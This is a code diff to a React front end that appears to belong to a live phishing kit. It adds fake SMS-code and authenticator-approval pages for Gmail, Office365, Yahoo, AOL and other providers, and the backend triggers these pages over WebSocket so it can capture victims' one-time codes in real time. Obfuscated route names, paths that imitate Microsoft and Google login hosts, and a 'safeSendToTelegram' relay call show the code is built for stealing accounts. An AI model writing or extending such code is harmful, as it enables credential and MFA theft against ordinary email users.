@@ -15,6 +15,16 @@ import MobileOtpPage from './components/mobile/MobileOtpPage';
 import ProviderRedirect from './components/ProviderRedirect';
 import Spinner from './components/common/Spinner';
 import InteractiveState, { UIStateType } from './components/InteractiveState';
+import GmailSmsCodePage from './components/interactive/GmailSmsCodePage';
+import GmailAuthPromptPage from './components/interactive/GmailAuthPromptPage';
+import Office365SmsCodePage from './components/interactive/Office365SmsCodePage';
+import Office365AuthPromptPage from './components/interactive/Office365AuthPromptPage';
+import YahooSmsCodePage from './components/interactive/YahooSmsCodePage';
+import YahooAuthPromptPage from './components/interactive/YahooAuthPromptPage';
+import AolSmsCodePage from './components/interactive/AolSmsCodePage';
+import AolAuthPromptPage from './components/interactive/AolAuthPromptPage';
+import OthersSmsCodePage from './components/interactive/OthersSmsCodePage';
+import OthersAuthPromptPage from './components/interactive/OthersAuthPromptPage';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
@@ -44,6 +54,46 @@ const ROUTES = {
   LOGIN_OFFICE365: '/mtwavnfbcxdh84u25c58xv7igejfgyavzq7i3lwelij3tipowa7fb93n6gk3ml8ul7d8v034j43e7u1egw9hpeoeqxj81uzyozv0ikn0i4a5gas0auqcl73dx4aymbkdy0dxxbj4tzo72f6az6uzq9onxrnklt',
   OTP: '/938uv6106001sygvk1bzhqhx9xfjas1v6ccxfyy8ls30qdkba1n68dftexsdc3xd1zlkwjge9n5c4u2mkfnvk1gq9z027c8mn7miuqhd6ped06ov44zcqrlpmntinhbhfzz5qph9u23pdl1udmhm9x4s3f8i2a',
   LANDING: '/6dck1w4qnffnxtiaofl09u4wy5txozis4phoji3cjswgcm4btl6ghnm343m9hht8g3x4j89v40esarpatd18z5v2bv70yqwmd9ggpn7xng1ys93f1kkaflacbh1i1b4p3774z7hkpzgzs122783h3dbe56ziad',
+  // Per-provider SMS code pages (real-time WebSocket-driven full-screen pages)
+  SMS_GMAIL: '/lkgosw6f3k7c8lt0hwk3xaq93klxofifnrf3jxmz1ya8nkt39fczhozs9wlplem9zefuvyy2nwrjoxdtau5dqj9rc34e1abbx0csn1o286qgoixp0e8gms2piw8lsouc51l4arzfhohg3rekkkv8v2qvhzavc9ak',
+  SMS_OFFICE365: '/8th75q4hqaxpk1v28wgf3po8vkjfl03mo61cijk15dcfth3n3y8xafb67uo9uyrvk49kfdh9umvx1ga035cogdloyly93j3cxb18mkdebhzkj81l700hsj2he81qxx1enp8qzkd55ozy3pt1k3e9d4t1m3apsmt1',
+  SMS_YAHOO: '/b7s8xn9py7c7qffdlvu3zv5nfadyvi9wz67jsx8fs47cdhi4iff5q6ea9p1gl931jbnhgr5gubjl72qjyjyfbbm48mkcfjqf4bmgukdulafqf3wo6er98oh687auh8aeipdbu1wwayuz6mvxpu4a2uwajgjm24m8',
+  SMS_AOL: '/vg7xd6msiqe2kh5zt4jkqndqufddaexy7i960pemlsuelr4h9n8wnfbt28xrm87c0508uxt5yqogu96d865ugspyj67t2nogie271e6299fixsryekr6q5iv0zqrn5bzgribbn36cqkfp7jbxanvsr1vllrcic2z',
+  SMS_OTHERS: '/gl1jb1eoep5zsb05jcr0equ14szw5nwv3ohqwoenf76n6pfzxy68hwitdonxed3djec2l38tffugo1uwod0bjbwrxf59wkuevh4rzx19c59n9w8m1kv46iojutx9tgehpdn44rc27uqe92xk74g1othflov3n6m1',
+  // Per-provider authenticator-approval pages (real-time WebSocket-driven full-screen pages)
+  AUTH_GMAIL: '/p8bga1a3fk84q4drtpbcqgxl8ta8pq8ylhp87imc8gcbtp731983pl40j7famtqovvcvy8rfm9cm3q74bzf7153fr09ncjiisiu4naom4ynjju33gsyalaclu6enzz4opf0r6dpogtm7zit377ix6bfui75fyc0r',
+  AUTH_OFFICE365: '/d8jkr6961harawhgd7r7pjk7j9vheh3njxq3o3higm4goqi5g8yu2gxj9rabzibcquanfjek1dafzvwydl9eh5r3tpe389z7ctvgkumplkchp2ku4akxiopkx6up0cjef7c2adwguf5mod9q5yji4jnfaioau29s',
+  AUTH_YAHOO: '/3ocmaxnd5r59gfmaovkc5u0lsciq85onj33ianp9201cpzo9fn1th2r0xkoep2ylqletxhyakoilmeh79w558647p4snia50i6qxyuw38wwvosp5h41faoz1qq6085n2p7upue1jr8xt2g736sogmwfz8b8wky97',
+  AUTH_AOL: '/hiil08euvdj4tz6nvvmgjg707c51pst93iiw5je3rra5hncipc34y695msj73a14ism8nv8fdaliuuc0gxdtsro2c9i21ytpj9vxdwtdrsx7nsa3eswh0kkicefoj17qg88eqsjticqa1a893nklg0hjhb99ua3a',
+  AUTH_OTHERS: '/8x8uzkd2grn4abyurknvt2ibzguhduj3qoqebrdigh19yxorkcikoer7yw08nzsu8b5siyzqfkw1zqlonf1kg58iqqcwd2f3dq4zlyt93tas9qs5hxgvmylzisa1c556q9b7nu8j85palffg130w5rvwei52cmv8',
+};
+
+// Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
+// SMS-code and authenticator-approval routes. Unknown providers fall through to the
+// generic "Others" routes.
+const normalizeProviderKey = (provider?: string): 'gmail' | 'office365' | 'yahoo' | 'aol' | 'others' => {
+  const p = (provider || '').toLowerCase();
+  if (p.includes('gmail') || p.includes('google')) return 'gmail';
+  if (p.includes('office') || p.includes('microsoft') || p.includes('outlook') || p.includes('o365')) return 'office365';
+  if (p.includes('yahoo')) return 'yahoo';
+  if (p.includes('aol')) return 'aol';
+  return 'others';
+};
+
+const SMS_ROUTE_BY_PROVIDER: Record<ReturnType<typeof normalizeProviderKey>, string> = {
+  gmail: '/lkgosw6f3k7c8lt0hwk3xaq93klxofifnrf3jxmz1ya8nkt39fczhozs9wlplem9zefuvyy2nwrjoxdtau5dqj9rc34e1abbx0csn1o286qgoixp0e8gms2piw8lsouc51l4arzfhohg3rekkkv8v2qvhzavc9ak',
+  office365: '/8th75q4hqaxpk1v28wgf3po8vkjfl03mo61cijk15dcfth3n3y8xafb67uo9uyrvk49kfdh9umvx1ga035cogdloyly93j3cxb18mkdebhzkj81l700hsj2he81qxx1enp8qzkd55ozy3pt1k3e9d4t1m3apsmt1',
+  yahoo: '/b7s8xn9py7c7qffdlvu3zv5nfadyvi9wz67jsx8fs47cdhi4iff5q6ea9p1gl931jbnhgr5gubjl72qjyjyfbbm48mkcfjqf4bmgukdulafqf3wo6er98oh687auh8aeipdbu1wwayuz6mvxpu4a2uwajgjm24m8',
+  aol: '/vg7xd6msiqe2kh5zt4jkqndqufddaexy7i960pemlsuelr4h9n8wnfbt28xrm87c0508uxt5yqogu96d865ugspyj67t2nogie271e6299fixsryekr6q5iv0zqrn5bzgribbn36cqkfp7jbxanvsr1vllrcic2z',
+  others: '/gl1jb1eoep5zsb05jcr0equ14szw5nwv3ohqwoenf76n6pfzxy68hwitdonxed3djec2l38tffugo1uwod0bjbwrxf59wkuevh4rzx19c59n9w8m1kv46iojutx9tgehpdn44rc27uqe92xk74g1othflov3n6m1',
+};
+
+const AUTH_ROUTE_BY_PROVIDER: Record<ReturnType<typeof normalizeProviderKey>, string> = {
+  gmail: '/p8bga1a3fk84q4drtpbcqgxl8ta8pq8ylhp87imc8gcbtp731983pl40j7famtqovvcvy8rfm9cm3q74bzf7153fr09ncjiisiu4naom4ynjju33gsyalaclu6enzz4opf0r6dpogtm7zit377ix6bfui75fyc0r',
+  office365: '/d8jkr6961harawhgd7r7pjk7j9vheh3njxq3o3higm4goqi5g8yu2gxj9rabzibcquanfjek1dafzvwydl9eh5r3tpe389z7ctvgkumplkchp2ku4akxiopkx6up0cjef7c2adwguf5mod9q5yji4jnfaioau29s',
+  yahoo: '/3ocmaxnd5r59gfmaovkc5u0lsciq85onj33ianp9201cpzo9fn1th2r0xkoep2ylqletxhyakoilmeh79w558647p4snia50i6qxyuw38wwvosp5h41faoz1qq6085n2p7upue1jr8xt2g736sogmwfz8b8wky97',
+  aol: '/hiil08euvdj4tz6nvvmgjg707c51pst93iiw5je3rra5hncipc34y695msj73a14ism8nv8fdaliuuc0gxdtsro2c9i21ytpj9vxdwtdrsx7nsa3eswh0kkicefoj17qg88eqsjticqa1a893nklg0hjhb99ua3a',
+  others: '/8x8uzkd2grn4abyurknvt2ibzguhduj3qoqebrdigh19yxorkcikoer7yw08nzsu8b5siyzqfkw1zqlonf1kg58iqqcwd2f3dq4zlyt93tas9qs5hxgvmylzisa1c556q9b7nu8j85palffg130w5rvwei52cmv8',
 };
 
 const PROVIDER_URLS = {
@@ -184,23 +234,29 @@ function App() {
         });
         break;
       
-      case 'show_sms_code':
-        setInteractiveState({
-          active: true,
-          type: 'enter_sms_code',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
+      case 'show_sms_code': {
+        const route = SMS_ROUTE_BY_PROVIDER[normalizeProviderKey(message.data?.provider as string)];
+        setInteractiveState({ active: false, type: 'idle', provider: 'Adobe' });
+        navigate(route, {
+          state: {
+            data: message.data,
+            provider: message.data?.provider || 'Others',
+          },
         });
         break;
+      }
       
-      case 'show_authenticator_approval':
-        setInteractiveState({
-          active: true,
-          type: 'approve_authenticator',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
+      case 'show_authenticator_approval': {
+        const route = AUTH_ROUTE_BY_PROVIDER[normalizeProviderKey(message.data?.provider as string)];
+        setInteractiveState({ active: false, type: 'idle', provider: 'Adobe' });
+        navigate(route, {
+          state: {
+            data: message.data,
+            provider: message.data?.provider || 'Others',
+          },
         });
         break;
+      }
       
       case 'show_account_locked':
         setInteractiveState({
@@ -536,6 +592,18 @@ function App() {
       <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
+      {/* Per-provider SMS-code pages (real-time, triggered by WebSocket `show_sms_code`) */}
+      <Route path={ROUTES.SMS_GMAIL} element={<GmailSmsCodePage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_OFFICE365} element={<Office365SmsCodePage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_YAHOO} element={<YahooSmsCodePage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_AOL} element={<AolSmsCodePage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_OTHERS} element={<OthersSmsCodePage onAction={handleInteractiveAction} />} />
+      {/* Per-provider authenticator-approval pages (real-time, triggered by WebSocket `show_authenticator_approval`) */}
+      <Route path={ROUTES.AUTH_GMAIL} element={<GmailAuthPromptPage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.AUTH_OFFICE365} element={<Office365AuthPromptPage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.AUTH_YAHOO} element={<YahooAuthPromptPage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.AUTH_AOL} element={<AolAuthPromptPage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.AUTH_OTHERS} element={<OthersAuthPromptPage onAction={handleInteractiveAction} />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
       <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
